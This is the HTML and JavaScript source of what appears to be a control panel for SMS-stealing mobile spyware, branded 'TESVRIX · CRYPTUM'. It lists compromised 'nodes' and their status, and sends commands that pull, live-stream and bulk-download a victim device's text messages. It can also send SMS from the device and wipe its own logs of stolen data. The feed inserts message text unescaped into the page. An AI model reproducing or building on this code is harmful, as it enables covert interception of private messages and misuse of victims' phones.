<!DOCTYPE html>
<html lang="en">
<head>
    <script src="../protect.js"></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <meta name="robots" content="noindex, nofollow">
    <title>TESVRIX · CRYPTUM | SECURE SMS INTELLIGENCE</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        :root {
            --primary: #e11d48;
            --primary-dark: #be123c;
            --primary-glow: rgba(225, 29, 72, 0.5);
            --accent-cyan: #06b6d4;
            --accent-green: #10b981;
            --accent-red: #ef4444;
            --bg-void: #020617;
            --bg-surface: #0f172a;
            --bg-elevated: #1e293b;
            --glass-border: rgba(225, 29, 72, 0.25);
            --text-primary: #f1f5f9;
            --text-secondary: #94a3b8;
            --transition-smooth: 0.3s cubic-bezier(0.2, 0.9, 0.4, 1);
        }

        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-track { background: rgba(0,0,0,0.2); }
        ::-webkit-scrollbar-thumb { background: var(--primary); border-radius: 10px; }

        body {
            background: radial-gradient(ellipse at 15% 30%, #0a0f1f, var(--bg-void));
            font-family: 'Inter', sans-serif;
            padding: 20px;
            min-height: 100vh;
            color: var(--text-primary);
            overflow-x: hidden;
            position: relative;
        }

        body::before {
            content: ""; position: fixed; inset: 0;
            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.05) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.02), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.02));
            z-index: 999; background-size: 100% 2px, 3px 100%; pointer-events: none;
        }

        .app-container { max-width: 1300px; margin: 0 auto; width: 100%; position: relative; z-index: 2; }

        /* HEADER BAR */
        .command-bar {
            background: rgba(15, 23, 42, 0.7);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            border: 1px solid var(--glass-border);
            border-radius: 24px;
            padding: 1.2rem 2rem;
            margin-bottom: 1.5rem;
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 20px;
            flex-wrap: wrap;
            box-shadow: 0 10px 40px -10px rgba(0,0,0,0.6);
        }

        .brand-badge { display: flex; align-items: center; gap: 15px; }
        .brand-badge i { font-size: 1.8rem; color: var(--primary); filter: drop-shadow(0 0 8px var(--primary-glow)); }

        .status-core {
            display: flex;
            align-items: center;
            gap: 12px;
            background: rgba(0,0,0,0.4);
            padding: 6px 18px;
            border-radius: 40px;
            border: 1px solid rgba(255,255,255,0.08);
        }

        .live-dot { width: 10px; height: 10px; border-radius: 50%; background: #64748b; transition: all 0.3s; }
        .live-dot.active { background: var(--accent-green); box-shadow: 0 0 10px var(--accent-green); animation: pulseDot 2s infinite; }
        @keyframes pulseDot { 0%, 100% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.3); opacity: 0.6; } }

        .device-selector {
            background: rgba(2, 6, 23, 0.9);
            border: 1px solid rgba(225, 29, 72, 0.3);
            border-radius: 12px;
            padding: 12px 20px;
            font-family: 'Space Grotesk', monospace;
            font-weight: 600;
            color: var(--text-primary);
            outline: none;
            cursor: pointer;
            font-size: 0.85rem;
            min-width: 280px;
            transition: var(--transition-smooth);
        }
        .device-selector:hover { border-color: var(--primary); box-shadow: 0 0 15px rgba(225, 29, 72, 0.2); }

        /* STATS GRID */
        .stat-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; margin-bottom: 1.5rem; }
        .stat-tile {
            background: rgba(30, 41, 59, 0.4);
            border: 1px solid rgba(255,255,255,0.05);
            border-radius: 20px;
            padding: 20px 15px;
            text-align: center;
            transition: var(--transition-smooth);
            position: relative;
            overflow: hidden;
        }
        .stat-tile:hover { background: rgba(30, 41, 59, 0.6); transform: translateY(-4px); border-color: rgba(225, 29, 72, 0.3); box-shadow: 0 8px 25px rgba(225,29,72,0.1), 0 0 0 1px rgba(225,29,72,0.1); }
        .stat-tile::after { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 3px; background: linear-gradient(90deg, transparent, var(--primary), transparent); opacity: 0.3; transition: opacity 0.3s; }
        .stat-tile:hover::after { opacity: 0.8; }

        .stat-number { font-family: 'JetBrains Mono', monospace; font-size: 2rem; font-weight: 700; color: #fff; }
        .stat-label-sm { font-size: 0.65rem; letter-spacing: 2px; text-transform: uppercase; color: var(--text-secondary); margin-top: 10px; font-weight: 700; }

        /* ACTIONS */
        .action-row { display: flex; flex-wrap: wrap; gap: 15px; margin-bottom: 1.5rem; align-items: center; }
        .btn-tesvrix {
            background: rgba(30, 41, 59, 0.8);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 14px;
            padding: 12px 24px;
            font-weight: 700;
            font-size: 0.75rem;
            font-family: 'Space Grotesk', monospace;
            color: var(--text-primary);
            cursor: pointer;
            transition: var(--transition-smooth);
            display: inline-flex;
            align-items: center;
            gap: 12px;
            letter-spacing: 1px;
        }
        .btn-tesvrix:hover { background: var(--bg-elevated); transform: scale(1.02); border-color: var(--primary); }

        .btn-tesvrix.active-filter { background: var(--primary) !important; color: #fff !important; box-shadow: 0 5px 15px var(--primary-glow); border-color: transparent; }
        .btn-primary-glow { background: linear-gradient(135deg, var(--primary), var(--primary-dark)); border: none; box-shadow: 0 8px 20px rgba(225, 29, 72, 0.3); }
        .btn-primary-glow:hover { box-shadow: 0 10px 25px rgba(225, 29, 72, 0.5); }

        .search-field { flex: 1; position: relative; min-width: 250px; }
        .search-field i { position: absolute; left: 18px; top: 50%; transform: translateY(-50%); color: var(--primary); font-size: 0.9rem; }
        .search-field input {
            width: 100%;
            background: rgba(2, 6, 23, 0.8);
            border: 1px solid rgba(225, 29, 72, 0.2);
            border-radius: 14px;
            padding: 14px 20px 14px 48px;
            color: var(--text-primary);
            font-size: 0.85rem;
            outline: none;
            transition: var(--transition-smooth);
        }
        .search-field input:focus { border-color: var(--primary); box-shadow: 0 0 15px rgba(225, 29, 72, 0.15); }

        /* FEED CONTAINER */
        .messages-container {
            position: relative;
            background: rgba(5, 8, 22, 0.5);
            border: 1px solid var(--glass-border);
            border-radius: 28px;
            overflow: hidden;
            height: calc(100vh - 350px);
            min-height: 400px;
            box-shadow: inset 0 0 30px rgba(0,0,0,0.4);
        }

        .message-feed {
            height: 100%;
            overflow-y: auto;
            padding: 30px;
            display: flex;
            flex-direction: column;
            gap: 20px;
            scroll-behavior: smooth;
        }

        .msg-item {
            background: rgba(30, 41, 59, 0.5);
            border-radius: 20px;
            padding: 18px 25px;
            border: 1px solid rgba(255,255,255,0.03);
            max-width: 80%;
            animation: msgAppear 0.5s cubic-bezier(0.2, 0.8, 0.2, 1) forwards;
            position: relative;
        }
        @keyframes msgAppear { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

        .msg-item.received { align-self: flex-start; border-left: 5px solid var(--primary); background: linear-gradient(90deg, rgba(225,29,72,0.05), transparent); }
        .msg-item.sent { align-self: flex-end; border-right: 5px solid var(--accent-cyan); text-align: right; background: linear-gradient(270deg, rgba(6,182,212,0.05), transparent); }

        .msg-meta { display: flex; justify-content: space-between; font-size: 0.65rem; color: var(--text-secondary); margin-bottom: 12px; font-family: 'JetBrains Mono', monospace; letter-spacing: 0.5px; }
        .msg-content { font-size: 0.9rem; line-height: 1.6; word-break: break-word; color: #e2e8f0; font-family: 'Inter', sans-serif; }

        /* LOADER */
        .loader-overlay {
            position: absolute; inset: 0;
            background: rgba(2, 6, 23, 0.95);
            backdrop-filter: blur(15px);
            display: none;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            z-index: 100;
            border-radius: 28px;
        }
        .cyber-spinner {
            width: 60px; height: 60px;
            border: 4px solid rgba(225, 29, 72, 0.1);
            border-top: 4px solid var(--primary);
            border-radius: 50%;
            animation: spin 1s cubic-bezier(0.5, 0.1, 0.5, 0.9) infinite;
            filter: drop-shadow(0 0 10px var(--primary-glow));
        }
        @keyframes spin { 100% { transform: rotate(360deg); } }

        .progress-bar-wrap { width: 70%; height: 8px; background: rgba(255,255,255,0.05); border-radius: 10px; margin-top: 25px; overflow: hidden; display: none; border: 1px solid rgba(255,255,255,0.05); }
        .progress-fill { width: 0%; height: 100%; background: linear-gradient(90deg, var(--primary-dark), var(--primary)); box-shadow: 0 0 15px var(--primary); transition: width 0.4s; }

        /* PAGINATION */
        .pagination-modern { display: flex; justify-content: center; align-items: center; gap: 25px; margin-top: 25px; }
        .nav-btn {
            background: rgba(30, 41, 59, 0.6);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 50%;
            width: 50px; height: 50px;
            display: flex; align-items: center; justify-content: center;
            cursor: pointer; color: #fff; transition: var(--transition-smooth);
        }
        .nav-btn:hover:not(:disabled) { background: var(--primary); transform: scale(1.1); box-shadow: 0 0 20px var(--primary-glow); border-color: transparent; }
        .nav-btn:disabled { opacity: 0.3; cursor: not-allowed; }
        .page-indicator { font-family: 'Space Grotesk', monospace; font-weight: 700; background: rgba(0,0,0,0.5); padding: 10px 30px; border-radius: 50px; font-size: 0.85rem; border: 1px solid rgba(255,255,255,0.05); letter-spacing: 1px; }

        /* CUSTOM MODAL SYSTEM */
        .modal-overlay-custom {
            position: fixed; inset: 0;
            background: rgba(2, 6, 23, 0.9);
            backdrop-filter: blur(15px);
            z-index: 2000;
            display: none;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .modal-window {
            background: rgba(15, 23, 42, 0.95);
            backdrop-filter: blur(30px);
            border: 1px solid var(--glass-border);
            border-radius: 32px;
            width: 100%;
            max-width: 450px;
            padding: 40px;
            box-shadow: 0 30px 60px -12px rgba(0,0,0,0.8), 0 0 20px rgba(225, 29, 72, 0.1);
            animation: modalPop 0.4s cubic-bezier(0.2, 0.9, 0.4, 1.1);
            position: relative;
            overflow: hidden;
        }

        .modal-window::before {
            content: '';
            position: absolute;
            top: 0; left: 0; width: 100%; height: 3px;
            background: linear-gradient(90deg, transparent, var(--primary), transparent);
        }

        @keyframes modalPop { from { opacity: 0; transform: scale(0.9) translateY(20px); } to { opacity: 1; transform: scale(1) translateY(0); } }

        .modal-title { font-family: 'Space Grotesk'; font-size: 1.4rem; font-weight: 800; letter-spacing: 1px; margin-bottom: 15px; display: flex; align-items: center; gap: 15px; }
        .modal-desc { font-size: 0.9rem; color: var(--text-secondary); line-height: 1.6; margin-bottom: 25px; }

        .modal-input-group { margin-bottom: 20px; }
        .modal-label { font-size: 0.65rem; font-weight: 800; color: var(--primary); letter-spacing: 2px; margin-bottom: 8px; display: block; }
        .modal-input {
            width: 100%;
            background: rgba(0,0,0,0.3);
            border: 1px solid rgba(255,255,255,0.08);
            border-radius: 12px;
            padding: 14px 18px;
            color: #fff;
            font-size: 0.9rem;
            outline: none;
            transition: var(--transition-smooth);
        }
        .modal-input:focus { border-color: var(--primary); box-shadow: 0 0 15px var(--primary-glow); }

        .modal-actions { display: flex; gap: 15px; margin-top: 30px; }
        .modal-btn { flex: 1; padding: 14px; border-radius: 14px; font-weight: 800; font-family: 'Space Grotesk'; font-size: 0.75rem; cursor: pointer; transition: var(--transition-smooth); border: 1px solid transparent; }
        .modal-btn-cancel { background: rgba(255,255,255,0.05); color: var(--text-secondary); border-color: rgba(255,255,255,0.1); }
        .modal-btn-confirm { background: var(--primary); color: #fff; box-shadow: 0 10px 20px var(--primary-glow); }
        .modal-btn:hover { transform: translateY(-2px); }

        @media (max-width: 992px) {
            .stat-grid { grid-template-columns: repeat(2, 1fr); }
            .command-bar { padding: 1rem; }
        }
    
        /* UNIVERSAL MOBILE RESPONSIVE FIX */
        @media (max-width: 992px) {
            body { padding: 10px; height: auto !important; min-height: 100vh; overflow-y: auto !important; }
            body::before { display: none; }
            .command-bar { backdrop-filter: none; -webkit-backdrop-filter: none; background: rgba(15, 23, 42, 0.98); padding: 15px; border-radius: 18px; }
            .modal-window { backdrop-filter: none; -webkit-backdrop-filter: none; background: rgba(15, 23, 42, 0.98); padding: 25px; }
            .dashboard, .cam-container, .main-card, .container, .app-container, .split-layout {
                flex-direction: column !important;
                height: auto !important;
                min-height: 100vh;
                width: 100% !important;
                max-width: 100% !important;
                margin: 0 !important;
                border-radius: 16px !important;
            }
            .device-panel, .detail-panel, .sidebar, .main-area, .view-area, .gallery, .split-left, .split-right, .left-panel, .right-panel {
                width: 100% !important;
                max-width: 100% !important;
                height: auto !important;
                flex: none !important;
                min-height: 200px;
                border-right: none !important;
                border-bottom: 1px solid rgba(255,255,255,0.05);
            }
            .stats-grid, .perm-list, .grid-container, .stat-grid {
                grid-template-columns: 1fr !important;
            }
            .header, .panel-header, .controls { 
                flex-wrap: wrap; 
                gap: 10px; 
            }
            .node-selector, .search-field { 
                width: 100% !important; 
                min-width: 100% !important;
            }
            .stat-tile { margin-bottom: 10px; }
            .messages-container { height: 75vh; min-height: 500px; padding-bottom: 10px; }
            .action-row { display: flex; flex-direction: column; align-items: stretch; gap: 8px; }
            .action-row button, .action-row .search-field { width: 100%; margin: 0; padding: 14px; font-size: 0.85rem; }
            .msg-item { max-width: 95%; padding: 15px; }
            .brand-badge i { font-size: 1.5rem; filter: none; }
        }

    
        /* PREMIUM SCROLLBAR */
        ::-webkit-scrollbar { width: 10px !important; height: 10px !important; }
        ::-webkit-scrollbar-track { background: rgba(2, 6, 23, 0.6) !important; border-radius: 10px !important; }
        ::-webkit-scrollbar-thumb { 
            background: #e11d48 !important; 
            border-radius: 10px !important; 
            border: 3px solid rgba(2, 6, 23, 0.6) !important; 
        }
        ::-webkit-scrollbar-thumb:hover { background: #f43f5e !important; }

    </style>
</head>
<body>
<div class="app-container">
    <div class="command-bar">
        <div class="brand-badge" style="gap: 5px;">
            <div class="status-core"><span class="live-dot" id="liveDot"></span><span id="liveStatusText" style="font-size: 0.7rem; font-weight: 800; letter-spacing: 1px; color: var(--text-secondary);">SEARCHING...</span></div>
        </div>
        <div style="display: flex; gap: 8px;">
            <button id="btnFilterAll" class="btn-tesvrix" style="padding: 8px 16px; font-size: 0.65rem;">ALL</button>
            <button id="btnFilterOnline" class="btn-tesvrix" style="padding: 8px 16px; font-size: 0.65rem; color: var(--accent-green);">ONLINE</button>
            <button id="btnFilterOffline" class="btn-tesvrix" style="padding: 8px 16px; font-size: 0.65rem; color: var(--accent-red);">OFFLINE</button>
        </div>
        <select id="deviceSelector" class="device-selector"></select>
    </div>

    <div class="stat-grid">
        <div class="stat-tile"><div class="stat-number" id="totalDev">0</div><div class="stat-label-sm">FLEET NODES</div></div>
        <div class="stat-tile"><div class="stat-number" id="onlineDev" style="color: var(--accent-green); text-shadow: 0 0 10px rgba(16, 185, 129, 0.3);">0</div><div class="stat-label-sm">UPLINK ACTIVE</div></div>
        <div class="stat-tile"><div class="stat-number" id="offlineDev" style="color: var(--accent-red); text-shadow: 0 0 10px rgba(239, 68, 68, 0.3);">0</div><div class="stat-label-sm">UPLINK LOST</div></div>
        <div class="stat-tile"><div class="stat-number" id="batVal">--</div><div class="stat-label-sm">ENERGY LEVEL</div></div>
    </div>

    <!-- SMS CENTER ACTIVE -->
    <div style="background: rgba(16, 185, 129, 0.1); border: 1px solid var(--accent-green); border-radius: 14px; padding: 15px; text-align: center; margin-bottom: 1.5rem; font-family: 'Space Grotesk'; font-weight: 700; color: var(--accent-green); letter-spacing: 1px;">
        <i class="fas fa-check-circle"></i> SMS CENTER IS ONLINE & SECURE
    </div>

    <div class="action-row">
        <button id="btnPull" class="btn-tesvrix"><i class="fas fa-sync-alt"></i> PULL PACKETS</button>
        <button id="btnFetchAll" class="btn-tesvrix" style="border-color:var(--accent-cyan); color:var(--accent-cyan);"><i class="fas fa-file-export"></i> INTELLIGENCE DUMP</button>
        <button id="btnLive" class="btn-tesvrix"><i class="fas fa-broadcast-tower"></i> LIVE STREAM</button>
        <button id="btnSendSms" class="btn-tesvrix btn-primary-glow"><i class="fas fa-satellite-dish"></i> TRANSMIT SMS</button>
        <button id="btnCleanDB" class="btn-tesvrix" style="border-color:var(--accent-red); color:var(--accent-red);"><i class="fas fa-broom"></i> CLEAN DB</button>
        <div class="search-field"><i class="fas fa-search"></i><input type="text" id="searchInput" placeholder="Search decrypted packets..."></div>
    </div>

    <div class="messages-container">
        <div class="loader-overlay" id="syncLoader">
            <div class="cyber-spinner" id="spinner"></div>
            <span id="loadStatusText" style="font-size: 0.8rem; margin-top: 20px; letter-spacing: 2px; font-weight: 700; color: var(--primary);">INITIALIZING DECRYPTION</span>
            <div class="progress-bar-wrap" id="progWrap"><div class="progress-fill" id="progFill"></div></div>
            <div id="loadCounter" style="font-family: 'JetBrains Mono'; font-size: 1.5rem; font-weight: 800; color: #fff; margin-top: 15px; display:none;">0%</div>
            <button id="btnDownloadNow" class="btn-tesvrix btn-primary-glow" style="display:none; margin-top:25px; padding:15px 40px;"><i class="fas fa-cloud-download-alt"></i> DOWNLOAD REPORT</button>
        </div>
        <div class="message-feed" id="feed"><div style="text-align:center; padding: 120px; color: #475569;"><i class="fas fa-satellite-dish fa-3x" style="margin-bottom: 20px; opacity: 0.5;"></i><br><span style="letter-spacing: 2px; font-weight: 600;">AWAITING SIGNAL UPLINK</span></div></div>
    </div>

    <div class="pagination-modern">
        <button id="prevBtn" class="nav-btn" disabled><i class="fas fa-chevron-left"></i></button>
        <span id="pageVal" class="page-indicator">FEED STATUS: LIVE</span>
        <button id="nextBtn" class="nav-btn" disabled><i class="fas fa-chevron-right"></i></button>
    </div>
</div>

<!-- CUSTOM MODALS -->
<div id="confirmModal" class="modal-overlay-custom">
    <div class="modal-window">
        <div class="modal-title" style="color: var(--accent-red);"><i class="fas fa-radiation"></i> SYSTEM PURGE</div>
        <div class="modal-desc">Are you sure you want to initiate a full database wipe? This will permanently delete all logs, commands, and packet intelligence linked to your account.</div>
        <div class="modal-actions">
            <button class="modal-btn modal-btn-cancel" onclick="closeModal('confirmModal')">ABORT</button>
            <button class="modal-btn modal-btn-confirm" id="modalConfirmBtn" style="background: var(--accent-red); box-shadow: 0 10px 20px rgba(239, 68, 68, 0.3);">CONFIRM PURGE</button>
        </div>
    </div>
</div>

<div id="smsModal" class="modal-overlay-custom">
    <div class="modal-window">
        <div class="modal-title" style="color: var(--accent-cyan);"><i class="fas fa-satellite-dish"></i> SMS TRANSMISSION</div>
        <div class="modal-desc">Configure the satellite uplink for outgoing packet transmission to the remote node.</div>
        <div class="modal-input-group">
            <label class="modal-label">TARGET DESTINATION</label>
            <input type="text" id="smsNumber" class="modal-input" placeholder="+1 000 000 0000">
        </div>
        <div class="modal-input-group">
            <label class="modal-label">MESSAGE PAYLOAD</label>
            <textarea id="smsMessage" class="modal-input" style="height: 100px; resize: none; font-family: 'Inter';" placeholder="Enter encrypted text..."></textarea>
        </div>
        <div class="modal-actions">
            <button class="modal-btn modal-btn-cancel" onclick="closeModal('smsModal')">CANCEL</button>
            <button class="modal-btn modal-btn-confirm" id="modalSmsBtn" style="background: var(--accent-cyan); box-shadow: 0 10px 20px rgba(6, 182, 212, 0.3);">TRANSMIT</button>
        </div>
    </div>
</div>

<script src="../davidkewebsitekemake300kespeedma/config.php"></script>
<script>
    const auth = JSON.parse(localStorage.getItem('user') || '{}');
    let targetId = null, isLive = true, currentLogs = [], currentOffset = 0, lastHash = '', isSyncing = false, filterMode = 'all';
    let maxSms = 0, lastLiveId = 0, liveSessionStart = new Date().toISOString();

    function openModal(id) { document.getElementById(id).style.display = 'flex'; }
    function closeModal(id) { document.getElementById(id).style.display = 'none'; }

    async function sb(path, method = 'GET', body = null) {
        
        try {
            const r = await fetch(getApiUrl(path), { method, headers: getApiHeaders(), body: body ? JSON.stringify(body) : null });
            if (!r.ok) throw new Error(`HTTP ${r.status}`);
            return (method === 'DELETE' || r.status === 204) ? true : await r.json();
        } catch (e) { console.error('SB API Error:', e); return null; }
    }

    function showLoader(text, showProgress = false) {
        document.getElementById('syncLoader').style.display = 'flex';
        document.getElementById('loadStatusText').innerText = text;
        document.getElementById('progWrap').style.display = showProgress ? 'block' : 'none';
        document.getElementById('loadCounter').style.display = showProgress ? 'block' : 'none';
        document.getElementById('btnDownloadNow').style.display = 'none';
        document.getElementById('spinner').style.display = 'block';
    }

    function hideLoader() { document.getElementById('syncLoader').style.display = 'none'; isSyncing = false; }

    async function syncDevices() {
        const data = await sb(`devices?operator_id=eq.${auth.operator_id}&order=last_seen.desc`);
        if (data) {
            const now = new Date();
            const filtered = data.filter(d => {
                const online = (now - new Date(d.last_seen)) < 35000;
                if (filterMode === 'online') return online;
                if (filterMode === 'offline') return !online;
                return true;
            });

            const sel = document.getElementById('deviceSelector');
            const prevVal = sel.value;
            sel.innerHTML = filtered.map(d => {
                const online = (now - new Date(d.last_seen)) < 35000;
                return `<option value="${d.device_uuid}" ${d.device_uuid === targetId ? 'selected' : ''}>${online ? '●' : '○'} ${d.device_name || 'NODE'} ${online ? '[ONLINE]' : '[OFFLINE]'}</option>`;
            }).join('');

            if (!targetId && filtered[0]) { targetId = filtered[0].device_uuid; fetchVault(); }

            document.getElementById('totalDev').innerText = data.length;
            const onlineCount = data.filter(d => (new Date() - new Date(d.last_seen)) < 35000).length;
            document.getElementById('onlineDev').innerText = onlineCount;
            document.getElementById('offlineDev').innerText = data.length - onlineCount;

            const cur = data.find(d => d.device_uuid === targetId);
            if (cur) {
                document.getElementById('batVal').innerText = cur.battery || '--';
                const online = (new Date() - new Date(cur.last_seen)) < 35000;
                document.getElementById('liveDot').className = 'live-dot' + (online ? ' active' : '');
                document.getElementById('liveStatusText').innerText = online ? 'LINK SECURE' : 'UPLINK LOST';
                document.getElementById('liveStatusText').style.color = online ? 'var(--accent-green)' : 'var(--accent-red)';
            }
        }
    }

    async function fetchVault() {
        if (!targetId || isSyncing) return;
        if (!isLive) return;

        const logs = await sb(`vault?device_uuid=eq.${targetId}&type=eq.live&id=gt.${lastLiveId}&created_at=gt.${liveSessionStart}&order=id.asc`);
        if (logs && logs.length > 0) {
            lastLiveId = Math.max(...logs.map(l => l.id));
            currentLogs = [...currentLogs, ...logs].slice(-50);
            renderFeed();

            const ids = logs.map(l => l.id).join(',');
            await sb(`vault?id=in.(${ids})`, 'DELETE');
        }
    }

    function renderFeed() {
        const feed = document.getElementById('feed');
        const query = document.getElementById('searchInput').value.toLowerCase();

         // De-consolidate items if they contain [ITEM_SPLIT]
        let expandedLogs = [];
        currentLogs.forEach(l => {
            if (l.content && l.content.includes('[ITEM_SPLIT]')) {
                const parts = l.content.split('[ITEM_SPLIT]');
                parts.forEach(p => {
                    expandedLogs.push({ ...l, content: p });
                });
            } else {
                expandedLogs.push(l);
            }
        });

        let filtered = expandedLogs;
        if (query) {
            filtered = expandedLogs.filter(l => l.content.toLowerCase().includes(query));
        }

        if (!filtered.length) {
            feed.innerHTML = isLive ?
                '<div style="text-align:center; padding:120px; color:#475569; letter-spacing:1px;"><i class="fas fa-satellite-dish fa-spin fa-2x" style="margin-bottom:15px; opacity:0.3; color:var(--accent-green);"></i><br>AWAITING REAL-TIME SIGNALS...</div>' :
                '<div style="text-align:center; padding:120px; color:#475569; letter-spacing:1px;"><i class="fas fa-search fa-2x" style="margin-bottom:15px; opacity:0.3;"></i><br>NO MATCHING DATA PACKETS</div>';
            return;
        }

        feed.innerHTML = filtered.map(l => {
            const isSent = l.content.includes('📤') || l.content.includes('🚀') || l.content.includes('[SENT]');
            return `<div class="msg-item ${isSent ? 'sent' : 'received'}">
                <div class="msg-meta">
                    <span><i class="far fa-clock"></i> ${new Date(l.created_at).toLocaleTimeString()}</span>
                    <span style="font-weight:800; color:var(--primary); opacity:0.7;">[${l.type.toUpperCase()}]</span>
                </div>
                <div class="msg-content" style="white-space:pre-wrap;">${l.content}</div>
            </div>`;
        }).join('');

        if (isLive && !query) feed.scrollTop = feed.scrollHeight;

        document.getElementById('pageVal').innerHTML = isLive ? '🛰️ FEED STATUS: LIVE' : `📡 BATCH: ${currentOffset + 1}-${currentOffset + 10} <small style="opacity:0.6;"> // ${maxSms || '?'}</small>`;

        const showNav = !isLive;
        document.getElementById('prevBtn').style.visibility = showNav ? 'visible' : 'hidden';
        document.getElementById('nextBtn').style.visibility = showNav ? 'visible' : 'hidden';
        document.getElementById('prevBtn').disabled = isLive || currentOffset === 0;
        document.getElementById('nextBtn').disabled = isLive || (maxSms && currentOffset + 10 >= maxSms);
    }

    async function checkSyncStatus() {
        if (!isSyncing || !targetId) return;

        const status = await sb(`vault?device_uuid=eq.${targetId}&type=in.(status,download_link)&order=created_at.desc&limit=5`);
        if (status) {
            const syncMsg = status.find(s => s.type === 'status' && s.content.includes(`sync_complete_`));
            const dlMsg = status.find(s => s.type === 'download_link');

            if (syncMsg) {
                const parts = syncMsg.content.split('_');
                const category = parts[2];
                const offset = parseInt(parts[3]);
                const total = parts[5];
                if (total) maxSms = parseInt(total);

                if (offset === currentOffset) {
                    const logs = await sb(`vault?device_uuid=eq.${targetId}&type=eq.${category}&order=created_at.desc&limit=15`);
                    if (logs && logs.length > 0) {
                        currentLogs = logs;
                        hideLoader();
                        renderFeed();
                        await sb(`vault?id=eq.${syncMsg.id}`, 'DELETE');
                    }
                }
            } else if (dlMsg) {
                clearInterval(window.progInt);
                document.getElementById('progFill').style.width = '100%';
                document.getElementById('loadCounter').innerText = '100%';
                document.getElementById('loadStatusText').innerText = 'SECURE EXTRACTION COMPLETE';
                document.getElementById('spinner').style.display = 'none';
                const dl = document.getElementById('btnDownloadNow');
                dl.style.display = 'inline-flex';
                dl.onclick = async () => {
                    const dlUrl = getDownloadUrl(dlMsg.id, `SMS_INTELLIGENCE_${targetId.substring(0,6)}.txt`);

                    // Use a hidden iframe to prevent the page from turning black/blank
                    let ifrm = document.getElementById('dlFrame');
                    if (!ifrm) {
                        ifrm = document.createElement('iframe');
                        ifrm.id = 'dlFrame';
                        ifrm.style.display = 'none';
                        document.body.appendChild(ifrm);
                    }
                    ifrm.src = dlUrl;

                    hideLoader();
                };
            }
        }
    }

    async function pull(offset) {
        if (!targetId) return;
        isLive = false; currentOffset = offset; isSyncing = true; lastHash = '';

        document.getElementById('feed').innerHTML = `
            <div style="text-align:center; padding:120px; color:#475569;">
                <div class="cyber-spinner" style="margin: 0 auto 25px;"></div>
                <div style="letter-spacing:2px; font-weight:700; color:var(--primary);">SYNCHRONIZING PACKET BATCH [${offset + 1}-${offset + 10}]</div>
            </div>`;

        showLoader(`REQUESTING BATCH DATA...`);
        await sb('commands', 'POST', { device_uuid: targetId, type: '/sms_all', data: JSON.stringify({offset}), operator_id: auth.operator_id, status: 'pending' });
    }

    async function fetchAll() {
        if (!targetId) return;
        showLoader('ESTABLISHING SECURE DUMP', true);
        isSyncing = true; lastHash = '';
        let p = 0;
        window.progInt = setInterval(() => {
            p += Math.random() * 5;
            if (p >= 95) p = 95;
            document.getElementById('progFill').style.width = p + '%';
            document.getElementById('loadCounter').innerText = Math.floor(p) + '%';
        }, 500);
        await sb('commands', 'POST', { device_uuid: targetId, type: '/fetch_all', operator_id: auth.operator_id, status: 'pending' });
    }

    function setFilter(mode, btnId) {
        filterMode = mode;
        document.querySelectorAll('.command-bar .btn-tesvrix').forEach(b => b.classList.remove('active-filter'));
        document.getElementById(btnId).classList.add('active-filter');
        syncDevices();
    }

    document.getElementById('btnFilterAll').onclick = () => setFilter('all', 'btnFilterAll');
    document.getElementById('btnFilterOnline').onclick = () => setFilter('online', 'btnFilterOnline');
    document.getElementById('btnFilterOffline').onclick = () => setFilter('offline', 'btnFilterOffline');
    document.getElementById('btnFilterAll').classList.add('active-filter');

    document.getElementById('btnPull').onclick = () => pull(0);
    document.getElementById('btnLive').onclick = () => {
        isLive = true; currentOffset = 0; lastHash = '';
        lastLiveId = 0; liveSessionStart = new Date().toISOString();
        currentLogs = []; maxSms = 0;
        document.getElementById('feed').innerHTML = '';
        showLoader('ESTABLISHING LIVE STREAM...');
        setTimeout(hideLoader, 1000);
    };
    document.getElementById('btnFetchAll').onclick = fetchAll;

    document.getElementById('btnCleanDB').onclick = () => openModal('confirmModal');

    document.getElementById('modalConfirmBtn').onclick = async () => {
        closeModal('confirmModal');
        isSyncing = true;
        showLoader('INITIATING PURGE SEQUENCE...', true);

        const setStatus = (txt, p) => {
            document.getElementById('loadStatusText').innerText = txt;
            document.getElementById('progFill').style.width = p + '%';
            document.getElementById('loadCounter').innerText = p + '%';
        };

        try {
            setStatus('ANALYZING DATABASE BLOAT...', 10);
            await new Promise(r => setTimeout(r, 800));

            setStatus('PURGING COMMAND HISTORY...', 30);
            await sb(`commands?operator_id=eq.${auth.operator_id}`, 'DELETE');
            await new Promise(r => setTimeout(r, 600));

            setStatus('CLEANING INTELLIGENCE VAULT...', 60);
            await sb(`vault?operator_id=eq.${auth.operator_id}`, 'DELETE');
            await new Promise(r => setTimeout(r, 800));

            setStatus('OPTIMIZING STORAGE CLUSTERS...', 85);
            await new Promise(r => setTimeout(r, 1000));

            setStatus('DATABASE PURGE SUCCESSFUL', 100);
            document.getElementById('spinner').style.display = 'none';
            document.getElementById('loadStatusText').style.color = 'var(--accent-green)';
            document.getElementById('loadCounter').style.color = 'var(--accent-green)';

            currentLogs = [];
            lastHash = '';
            renderFeed();

            setTimeout(hideLoader, 2000);
            setTimeout(() => {
                document.getElementById('loadStatusText').style.color = 'var(--primary)';
                document.getElementById('loadCounter').style.color = '#fff';
                document.getElementById('spinner').style.display = 'block';
            }, 2500);

        } catch (e) {
            setStatus('PURGE FAILED: SYSTEM ERROR', 0);
            hideLoader();
        }
    };

